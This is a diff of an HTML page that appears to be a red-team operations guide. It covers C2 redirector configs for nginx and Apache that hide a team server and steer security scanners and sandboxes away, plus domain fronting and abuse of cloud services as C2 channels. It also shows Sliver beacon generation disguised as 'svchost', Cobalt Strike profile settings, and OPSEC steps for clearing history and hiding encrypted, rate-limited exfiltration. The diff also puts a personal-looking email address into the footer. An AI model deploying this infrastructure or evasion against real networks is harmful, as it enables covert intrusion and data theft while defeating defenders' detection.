@@ -2822,7 +2822,7 @@
 </span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="w">    </span><span class="kn">ssl_certificate_key</span><span class="w"> </span><span class="s">/etc/letsencrypt/live/cdn-relay.&lt;DOMAIN&gt;/privkey.pem</span><span class="p">;</span>
 </span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="w">    </span><span class="c1"># --- C2 filter: forward only if URI + User-Agent match the profile ---</span>
 </span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="w">    </span><span class="kn">location</span><span class="w"> </span><span class="s">/api/v1/updates</span><span class="w"> </span><span class="p">{</span>
-</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="w">        </span><span class="kn">if</span><span class="w"> </span><span class="s">(</span><span class="nv">$http_user_agent</span><span class="w"> </span><span class="s">!~</span><span class="w"> </span><span class="s">&quot;Mozilla/5.0</span><span class="w"> </span><span class="s">\(Windows</span><span class="w"> </span><span class="s">NT</span><span class="w"> </span><span class="mi">10</span><span class="s">.0</span><span class="p">;</span><span class="w"> </span><span class="kn">Win64</span><span class="p">;</span><span class="w"> </span><span class="kn">x64\)&quot;)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="w">        </span><span class="kn">if</span><span class="w"> </span><span class="s">(</span><span class="nv">$http_user_agent</span><span class="w"> </span><span class="s">!~</span><span class="w"> </span><span class="s">"Mozilla/5.0</span><span class="w"> </span><span class="s">\(Windows</span><span class="w"> </span><span class="s">NT</span><span class="w"> </span><span class="mi">10</span><span class="s">.0</span><span class="p">;</span><span class="w"> </span><span class="kn">Win64</span><span class="p">;</span><span class="w"> </span><span class="kn">x64\)")</span><span class="w"> </span><span class="p">{</span>
 </span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="w">            </span><span class="kn">return</span><span class="w"> </span><span class="mi">302</span><span class="w"> </span><span class="s">https://www.bing.com</span><span class="p">;</span>
 </span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="w">        </span><span class="p">}</span>
 </span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="w">        </span><span class="kn">proxy_pass</span><span class="w"> </span><span class="s">https://&lt;TEAM_SERVER_IP&gt;:8443</span><span class="p">;</span>
@@ -2842,12 +2842,12 @@
 <div class="tabbed-block">
 <div class="language-apache highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c"># Forward only requests from the exact payload User-Agent + URI</span>
 </span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="nb">RewriteEngine</span><span class="w"> </span><span class="k">On</span>
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="nb">RewriteCond</span><span class="w"> </span>%{HTTP_USER_AGENT}<span class="w"> </span><span class="s2">&quot;^Mozilla/5\.0 \(Windows NT 10\.0; Win64; x64\) AppleWebKit&quot;</span><span class="w"> </span>[NC]
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="nb">RewriteCond</span><span class="w"> </span>%{REQUEST_URI}<span class="w"> </span><span class="s2">&quot;^/api/v1/updates$&quot;</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="nb">RewriteCond</span><span class="w"> </span>%{HTTP_USER_AGENT}<span class="w"> </span><span class="s2">"^Mozilla/5\.0 \(Windows NT 10\.0; Win64; x64\) AppleWebKit"</span><span class="w"> </span>[NC]
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="nb">RewriteCond</span><span class="w"> </span>%{REQUEST_URI}<span class="w"> </span><span class="s2">"^/api/v1/updates$"</span>
 </span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="nb">RewriteRule</span><span class="w"> </span>^(.*)$<span class="w"> </span>https://&lt;TEAM_SERVER_IP&gt;:8443$1<span class="w"> </span>[P,L]
 </span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="c"># Block known scanner / sandbox ASNs and security vendor ranges</span>
 </span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="nb">RewriteCond</span><span class="w"> </span>%{REMOTE_ADDR}<span class="w"> </span>^(34\.|35\.|104\.)<span class="w"> </span>[OR]
-</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="nb">RewriteCond</span><span class="w"> </span>%{HTTP_USER_AGENT}<span class="w"> </span><span class="s2">&quot;(urlscan|Shodan|Censys|VirusTotal|Any.Run)&quot;</span><span class="w"> </span>[NC]
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="nb">RewriteCond</span><span class="w"> </span>%{HTTP_USER_AGENT}<span class="w"> </span><span class="s2">"(urlscan|Shodan|Censys|VirusTotal|Any.Run)"</span><span class="w"> </span>[NC]
 </span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="nb">RewriteRule</span><span class="w"> </span>^(.*)$<span class="w"> </span>https://www.bing.com<span class="w"> </span>[R=302,L]
 </span></code></pre></div>
 </div>
@@ -2859,12 +2859,12 @@
 </span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>inner HTTP Host header points to YOUR domain — the CDN routes by Host but the network
 </span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>sees the benign SNI. Most major providers have mitigated this, but variants exist:
 </span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>
-</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>  - CDN &quot;Origin Rules&quot; / &quot;Custom Domains&quot; that let you control the edge behavior
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>  - CDN "Origin Rules" / "Custom Domains" that let you control the edge behavior
 </span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>  - Azure CDN / CloudFront with a custom origin matching your redirector
 </span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>  - Cloudflare Workers in front of the C2 (mTLS + Cloudflare Tunnel with access rules)
 </span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>  - Fastly / Google Cloud CDN equivalent configuration
 </span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>
-</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>Also consider &quot;living off legitimate services&quot; for egress:
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>Also consider "living off legitimate services" for egress:
 </span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>  - GitHub / GitLab / Dropbox / Slack / Discord / OneDrive as payload &amp; C2 channels
 </span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>  - Microsoft Graph API (Teams messages, OneDrive, Outlook drafts) as C2
 </span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>  - DNS over HTTPS (DoH) resolvers for DNS C2 to look like normal HTTPS traffic
@@ -2885,12 +2885,12 @@
 </span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>sliver<span class="w"> </span>&gt;<span class="w"> </span>generate<span class="w"> </span>beacon<span class="w"> </span>--mtls<span class="w"> </span>&lt;LHOST&gt;:8888<span class="w"> </span>--os<span class="w"> </span>windows<span class="w"> </span>--arch<span class="w"> </span>amd64<span class="w"> </span><span class="se">\</span>
 </span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="w">         </span>--seconds<span class="w"> </span><span class="m">60</span><span class="w"> </span>--jitter<span class="w"> </span><span class="m">30</span><span class="w"> </span>--name<span class="w"> </span>svchost<span class="w"> </span>--save<span class="w"> </span>/tmp/payload
 </span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a><span class="c1"># --- Cobalt Strike malleable profile essentials ---</span>
-</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a><span class="c1"># set sample_name &quot;notepad.exe&quot;;</span>
-</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a><span class="c1"># set sleep_time &quot;60000&quot;; set jitter &quot;40&quot;;</span>
-</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a><span class="c1"># set useragent &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ...&quot;;</span>
-</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a><span class="c1"># http-get { set uri &quot;/api/v1/updates /cdn/static /assets/js/app&quot;; ... }</span>
-</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a><span class="c1"># http-post { set uri &quot;/api/v1/telemetry&quot;; ... }</span>
-</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a><span class="c1"># profile verbs: client { metadata { base64; prepend &quot;session=&quot;;} } etc.</span>
+</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a><span class="c1"># set sample_name "notepad.exe";</span>
+</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a><span class="c1"># set sleep_time "60000"; set jitter "40";</span>
+</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a><span class="c1"># set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ...";</span>
+</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a><span class="c1"># http-get { set uri "/api/v1/updates /cdn/static /assets/js/app"; ... }</span>
+</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a><span class="c1"># http-post { set uri "/api/v1/telemetry"; ... }</span>
+</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a><span class="c1"># profile verbs: client { metadata { base64; prepend "session=";} } etc.</span>
 </span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a><span class="c1"># --- Validate profile syntax &amp; visualize the traffic ---</span>
 </span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a>./c2lint<span class="w"> </span>-T<span class="w"> </span>./profiles/malleable.profile
 </span></code></pre></div>
@@ -2899,9 +2899,9 @@
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># SECURITY BASELINE FOR OPERATOR VMs</span>
 </span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="c1"># - Dedicated VM per engagement (snapshot &amp; rollback after)</span>
 </span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="c1"># - No personal accounts, no bookmarks, no browser sync</span>
-</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="c1"># - Always use a VPN / residential proxy matching the target&#39;s geography</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="c1"># - Always use a VPN / residential proxy matching the target's geography</span>
 </span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="c1"># - Kill all telemetry: disable Microsoft/Google account sign-ins in the VM</span>
-</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="c1"># - Disk encryption + no clipboard sharing between &quot;persona&quot; and &quot;operator&quot; VMs</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="c1"># - Disk encryption + no clipboard sharing between "persona" and "operator" VMs</span>
 </span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="c1"># ARTIFACT HYGIENE</span>
 </span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="c1"># - Clear command history: history -c &amp;&amp; rm -rf ~/.bash_history</span>
 </span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="c1"># - Clean payload staging directories after each delivery</span>
@@ -2909,9 +2909,9 @@
 </span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a><span class="c1"># - Prefer living-off-the-land binaries to fresh tooling</span>
 </span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="c1"># - Avoid writing files to disk (execute in memory: reflective loading)</span>
 </span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a><span class="c1"># EXFIL OPSEC</span>
-</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a><span class="c1"># - Chunk &amp; &quot;blend&quot; exfil into legitimate-looking traffic patterns</span>
+</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a><span class="c1"># - Chunk &amp; "blend" exfil into legitimate-looking traffic patterns</span>
 </span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a><span class="c1"># - Encrypt before exfil (e.g. 7z with AES-256)</span>
-</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a><span class="c1"># 7z a -p&quot;&lt;PASS&gt;&quot; -mhe=on -v5m exfil.7z /sensitive/path/</span>
+</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a><span class="c1"># 7z a -p"&lt;PASS&gt;" -mhe=on -v5m exfil.7z /sensitive/path/</span>
 </span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a><span class="c1"># - Use the same protocol as legitimate business traffic (HTTPS/Teams/cloud)</span>
 </span><span id="__span-5-18"><a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a><span class="c1"># - Rate-limit exfil to avoid volume-based detections</span>
 </span><span id="__span-5-19"><a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a><span class="c1"># DEBRIEF DATA (keep a running log for the blue team)</span>
@@ -3032,7 +3032,7 @@
     
     
     
-    <a href="mailto:contact@example.com" target="_blank" rel="noopener" title="Email" class="md-social__link">
+    <a href="mailto:meghantashi.h4cks@gmail.com" target="_blank" rel="noopener" title="Email" class="md-social__link">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M48 64C21.5 64 0 85.5 0 112c0 15.1 7.1 29.3 19.2 38.4l208 156a48 48 0 0 0 57.6 0l208-156c12.1-9.1 19.2-23.3 19.2-38.4 0-26.5-21.5-48-48-48zM0 196v188c0 35.3 28.7 64 64 64h384c35.3 0 64-28.7 64-64V196L313.6 344.8c-34.1 25.6-81.1 25.6-115.2 0z"/></svg>
     </a>
   
